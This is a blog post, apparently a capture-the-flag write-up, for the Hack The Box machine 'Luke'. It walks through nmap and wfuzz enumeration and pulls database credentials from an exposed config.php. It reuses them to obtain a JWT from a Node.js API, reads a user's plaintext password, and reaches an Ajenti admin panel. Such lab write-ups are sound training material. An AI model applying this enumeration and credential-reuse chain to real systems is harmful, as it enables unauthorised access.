@@ -1,0 +1,183 @@
+---
+layout: post
+title: "HTB Writeup - Luke"
+date: 2019-07-24 12:00:00 +0000
+categories: jekyll update
+---
+
+# HTB Luke - Writeup
+<br />
+As always let's start with nmap:
+```
+root@kali:~/# nmap -sV -sT -sC -o nmapinitial luke.htb
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-09-13 12:57 EET
+Nmap scan report for luke.htb (10.10.10.137)
+Host is up (0.23s latency).
+Not shown: 995 closed ports
+PORT     STATE SERVICE VERSION
+21/tcp   open  ftp     vsftpd 3.0.3+ (ext.1)
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_drwxr-xr-x    2 0        0             512 Apr 14 12:35 webapp
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to 10.10.xx.xx
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session upload bandwidth limit
+|      No session download bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 4
+|      vsFTPd 3.0.3+ (ext.1) - secure, fast, stable
+|_End of status
+22/tcp   open  ssh?
+80/tcp   open  http    Apache httpd 2.4.38 ((FreeBSD) PHP/7.3.3)
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/2.4.38 (FreeBSD) PHP/7.3.3
+|_http-title: Luke
+3000/tcp open  http    Node.js Express framework
+|_http-title: Site doesn't have a title (application/json; charset=utf-8).
+8000/tcp open  http    Ajenti http control panel
+|_http-title: Ajenti
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 202.84 seconds
+root@kali:~/Desktop/HTB/boxes/luke#
+```
+
+The first noteceable thing is the FTP service which appears to be quite updated, therefore I don't want to investigate it at the moment. However, It allows anonymous login.
+We then have HTTP on ports 80, 3000, 8000 and SSH.
+From the banners grabbed by nmap, we can see that on port 3000 there is a node.js application, on port 8000 Ajenti Administration Panel. 
+
+Logging in anonymously on the FTP, the only thing we find is a message giving us two potential usernames: Chihiro and Derry. 
+
+# HTTP on 80
+On the port 80 we find a simple HTML website: 
+<img src="/assets/luke1.PNG" alt="drawing" width="600"/>
+
+Bruteforcing the directories: 
+```
+root@kali:~/# wfuzz -c --hc 404 -u http://luke.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt  
+
+Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+
+********************************************************
+* Wfuzz 2.3.4 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://luke.htb/FUZZ
+Total requests: 4614
+
+==================================================================
+ID   Response   Lines      Word         Chars          Payload    
+==================================================================
+
+000011:  C=403      9 L       24 W          213 Ch        ".hta"
+000001:  C=200    108 L      240 W         3138 Ch        ""
+000012:  C=403      9 L       24 W          218 Ch        ".htaccess"
+000013:  C=403      9 L       24 W          218 Ch        ".htpasswd"
+001114:  C=301      7 L       20 W          228 Ch        "css"
+002020:  C=200    108 L      240 W         3138 Ch        "index.html"
+002179:  C=301      7 L       20 W          227 Ch        "js"
+002282:  C=200     21 L      172 W         1093 Ch        "LICENSE"
+002435:  C=401     12 L       46 W          381 Ch        "management"
+002485:  C=301      7 L       20 W          231 Ch        "member"
+004286:  C=301      7 L       20 W          231 Ch        "vendor"
+
+Total time: 116.3713
+Processed Requests: 4614
+Filtered Requests: 4603
+Requests/sec.: 39.64892
+
+root@kali:~/Desktop/HTB/boxes/luke# wfuzz -c --hc 404 -u http://luke.htb/FUZZ.php -w /usr/share/wordlists/dirb/common.txt                                                                                         
+
+Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.                                                         
+
+********************************************************
+* Wfuzz 2.3.4 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://luke.htb/FUZZ.php
+Total requests: 4614
+
+==================================================================
+ID   Response   Lines      Word         Chars          Payload
+==================================================================
+
+000011:  C=403      9 L       24 W          217 Ch        ".hta"
+000012:  C=403      9 L       24 W          222 Ch        ".htaccess"
+000013:  C=403      9 L       24 W          222 Ch        ".htpasswd"
+000994:  C=200      6 L       25 W          202 Ch        "config"
+002347:  C=200     39 L      118 W         1593 Ch        "login"
+
+Total time: 140.0363
+Processed Requests: 4614
+Filtered Requests: 4609
+Requests/sec.: 32.94859
+```
+
+We got /management, /member, /config.php and /login.php. 
+
+The only interesting things I found are some db credentials on config.php: 
+```
+$dbHost = 'localhost'; $dbUsername = 'root'; $dbPassword = 'Zk6heYCyv6ZE9Xcg'; $db = "login"; $conn = new mysqli($dbHost, $dbUsername, $dbPassword,$db) or die("Connect failed: %s\n". $conn -> error); 
+```
+
+I usualy take note of all the logins location. I tried several with those creds, with no luck. 
+The only thing left is the node.js application, which uses JWT tokens for auth: 
+```
+root@kali:~/Desktop/HTB/boxes/luke# curl http://luke.htb:3000/
+{"success":false,"message":"Auth token is not supplied"}
+```
+
+Googling the response, I found [this article on medium]([https://medium.com/dev-bits/a-guide-for-adding-jwt-token-based-authentication-to-your-single-page-nodejs-applications-c403f7cf04f4]).
+
+Fuzzing the application, we can see that the /login does exist:
+```
+root@kali:~/Desktop/HTB/boxes/luke# wfuzz -c --hc 404 -u http://luke.htb:3000/FUZZ -w /usr/share/wordlists/dirb/common.txt
+
+Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+
+********************************************************
+* Wfuzz 2.3.4 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://luke.htb:3000/FUZZ
+Total requests: 4614
+
+==================================================================
+ID   Response   Lines      Word         Chars          Payload    
+==================================================================
+
+000001:  C=200      0 L        5 W           56 Ch        ""
+002347:  C=200      0 L        2 W           13 Ch        "login"
+002348:  C=200      0 L        2 W           13 Ch        "Login"
+004245:  C=200      0 L        5 W           56 Ch        "users"
+
+Total time: 147.3540
+Processed Requests: 4614
+Filtered Requests: 4610
+Requests/sec.: 31.31234
+```
+
+I tried logging in with the username admin and it worked:
+```
+curl --header "Content-Type: application/json" --request POST --data '{"password":"Zk6heYCyv6ZE9Xcg","username":"admin"}' http://luke.htb:3000/login 
+{"success":true,"message":"Authentication successful!","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTY4MzczNjA0LCJleHAiOjE1Njg0NjAwMDR9.Xt854IyFtvP4nQbQa_l63hIJ3aewfVT98gqz5gfU5Us"}
+```
+
+We now have access to the application with our token!
+
+/users now returns a list of user; /users/username reveals more info about each user:
+```
+root@kali:~/Desktop/HTB/boxes/luke# curl -X GET -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTY4MzczNjA0LCJleHAiOjE1Njg0NjAwMDR9.Xt854IyFtvP4nQbQa_l63hIJ3aewfVT98gqz5gfU5Us' http://luke.htb:3000/users/derry
+{"name":"Derry","password":"rZ86wwLvx7jUxtch"}
+```
+It is possible to login to /management as Derry. Here we found the credentials for Ajenti, which is a tool to manage a remote Linux using terminal, file manager...etc. 
+Once we got access to Ajenti, we owned the box! 
+
+
+
